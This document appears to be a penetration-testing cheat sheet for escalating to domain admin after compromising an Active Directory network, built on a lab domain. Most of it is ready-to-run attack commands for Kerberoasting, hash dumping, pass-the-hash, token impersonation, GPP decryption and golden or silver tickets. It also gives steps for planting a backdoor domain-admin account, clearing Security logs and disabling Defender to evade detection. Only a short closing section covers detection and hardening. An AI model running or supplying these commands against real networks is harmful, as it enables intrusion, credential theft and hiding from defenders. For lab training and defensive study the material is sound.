# POST-COMPROMISE ATTACK STRATEGY

After initial compromise of an Active Directory environment, follow a structured methodology to escalate privileges and achieve domain admin. This is the critical phase that determines success or detection.

## Overall Attack Flow

```
Initial Access
    ↓
Establish Persistence
    ↓
Enumeration & Reconnaissance
    ↓
Privilege Escalation
    ↓
Lateral Movement
    ↓
Domain Admin Access
    ↓
Complete Domain Control
```

## Phase 1: Quick Wins (Immediate Commands)

Once you have shell access on ANY compromised machine:

### Run Immediately (First 60 Seconds)

```bash
# Understand what you have
whoami
whoami /all
ipconfig /all
systeminfo

# Check for tools/software
tasklist
Get-Process
```

### Domain Enumeration (If on Domain Machine)

```bash
# Domain info
nltest /domain_trusts
net config workstation
wmic os get domain

# Quick user info
net user
whoami /groups
```

## Phase 2: Key Exploitation Targets

### Priority 1: Kerberoasting
**Time**: 5-10 minutes  
**Difficulty**: Easy  
**Success Rate**: 60-80%

```bash
impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 10.0.2.15 -request
hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt
```

### Priority 2: Dumping Hashes
**Time**: 10-20 minutes  
**Difficulty**: Medium  
**Success Rate**: 70-90%

```bash
impacket-secretsdump MARVEL.local/fcastle:Password1@10.0.2.15
# Crack with hashcat or use pass-the-hash
crackmapexec smb 10.0.2.0/24 -u administrator -H hash -d MARVEL.local
```

### Priority 3: Token Impersonation
**Time**: 5 minutes  
**Difficulty**: Easy (if SYSTEM access)  
**Success Rate**: 90%+

```bash
# Get SYSTEM on any machine > impersonate admin > create domain admin user
msfconsole
load incognito
impersonate_token MARVEL\\administrator
net user backdoor Password1 /add /domain
```

### Priority 4: Pass-the-Hash / Pass-the-Ticket
**Time**: 5-15 minutes  
**Difficulty**: Easy  
**Success Rate**: 85%+

```bash
# Get one hash > use everywhere
crackmapexec smb 10.0.2.0/24 -u administrator -H hash
impacket-psexec -hashes :hash MARVEL.local/administrator@DCNAME
```

## Phase 3: Common Domain Weaknesses

Check for these vulnerabilities in order:

### 1. Weak Service Account Passwords
- Enumerated via Kerberoasting
- Many use same password across multiple services
- Default/weak passwords common

### 2. GPP Passwords
- Old Group Policy Preference files still on SYSVOL
- Can be decrypted instantly
- Quick DA credential recovery

```bash
crackmapexec smb 10.0.2.15 -u fcastle -d MARVEL.local -p Password1 -M gpp_decrypt
```

### 3. Unconstrained Delegation
- Machine can impersonate ANY user via Kerberos delegation
- Capture DA tickets through coercion
- BloodHound reveals these instantly

### 4. NTLM Relay to LDAP
- Relay SMB auth to DC LDAP
- Modify user attributes
- Add yourself to admin groups
- No hash cracking needed

### 5. PrinterSpooler Abuse
- Network proofer relay attack
- Coerce machine account credentials
- Very reliable lateral movement

## Phase 4: Persistence Techniques

Once you have control:

### Domain Admin Backdoor
```powershell
net user backdoor Password1 /add /domain
net group "Domain Admins" backdoor /add /domain
# Use whenever needed, can't be easily detected
```

### Golden Tickets
```bash
# Dump krbtgt hash
impacket-secretsdump MARVEL.local/administrator:Password1@10.0.2.15
# Create eternal ticket - persists even after password changes
mimikatz.exe
kerberos::golden /user:FakeAdmin /domain:marvel.local /sid:S-1-5-21-xxx /krbtgt:hash /id:500
```

### Silver Tickets
```bash
# For specific server access
kerberos::golden /user:HiddenAdmin /domain:marvel.local /sid:S-1-5-21-xxx /target:dc.marvel.local /service:cifs /rc4:hash /id:500
```

### Machine Account Compromise
- Reset DC machine account password (ZeroLogon)
- Persistent DC access (one machine = whole domain)

## Phase 5: Evasion Techniques

The longer you stay undetected, the better:

### Use Living-off-the-Land
- Use built-in Windows tools (net, wmic, powershell)
- Avoid downloading obvious tools
- Blend with legitimate admin activity

### OPSEC Loose Ends
```bash
# Cover your tracks
Remove-Item -Path "LogPath" -Force
Clear-EventLog -LogName Security
Set-MpPreference -DisableRealtimeMonitoring $true
```

### Timing Attacks
- Don't enumerate 1000 users in 30 seconds
- Spread activity over hours/days
- Avoid obvious peak times

### Network Segmentation Bypass
- If VLANs separate networks:
- Use compromised machine in that segment
- Lateral move within segment first
- Then cross network if possible

## Quick Reference: To Domain Admin in 30 Minutes

1. **Compromise one user** (5 min)
   - Via initial access (phishing, web app, etc.)

2. **Kerberoast** (5 min)
   - Check if weak SPN passwords

3. **Dump hashes** (10 min)
   - If any admin on compromised machine
   - Or via SMB relay from captured hash

4. **Pass-the-Hash to DC** (5 min)
   - Use admin hash on DC
   - Get SYSTEM shell

5. **Create golden ticket** (5 min)
   - Dump krbtgt hash
   - Create eternal domain admin ticket

**Result**: Domain admin access, persistent, hard to detect

## Defense & Detection

### As a Defender, Watch For:

- Service principal enumeration (multiple GetUserSPNs)
- Large hash dumps (secretsdump activity)
- Unusual token impersonation / incognito usage
- Suspicious Kerberos ticket requests
- New domain user accounts created
- Domain group membership changes
- GPP file access/decryption attempts
- Multiple failed logins from same source

### Hardening Measures

- Disable Kerberos delegation (except where needed)
- Remove old GPP files with passwords
- Use managed service accounts (MSA)
- Require strong, unique service account passwords
- Enable audit logging on LDAP changes
- Monitor for golden ticket creation (Event ID 4769)
- Implement network segmentation
- Use passwordless auth (smart cards, Windows Hello)
- Deploy AD hardening (Tier 0 protection)
- Regular security audits with BloodHound
